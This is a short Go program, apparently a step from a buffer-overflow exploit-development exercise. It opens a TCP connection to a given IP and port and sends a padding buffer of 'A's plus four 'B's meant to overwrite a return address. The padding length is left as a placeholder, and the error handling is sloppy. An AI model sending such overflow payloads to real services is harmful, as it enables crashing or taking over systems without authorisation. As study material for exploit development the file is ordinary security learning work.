package main

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

/* Usage:
   go run 1_spiking_fuzzing.go <IP Address> <Port
*/

func main() {
	ip := os.Args[1]
	port := os.Args[2]
	address := fmt.Sprintf("%s:%s", ip, port)
	buffer := strings.Repeat("A", /*Based on the offset bytes, place your pattern here*/) + strings.Repeat("B", 4)
	conn, err := net.Dial("tcp", address)
		if err != nil {
			fmt.Printf("Connection failed", err.Error())
		}
	_, err = conn.Write([]byte(buffer + "\r\n"))
	if err != nil {
		panic("Connection failed while sending the exploit")
	}
	conn.Close()
	time.Sleep(1 * time.Second)
}
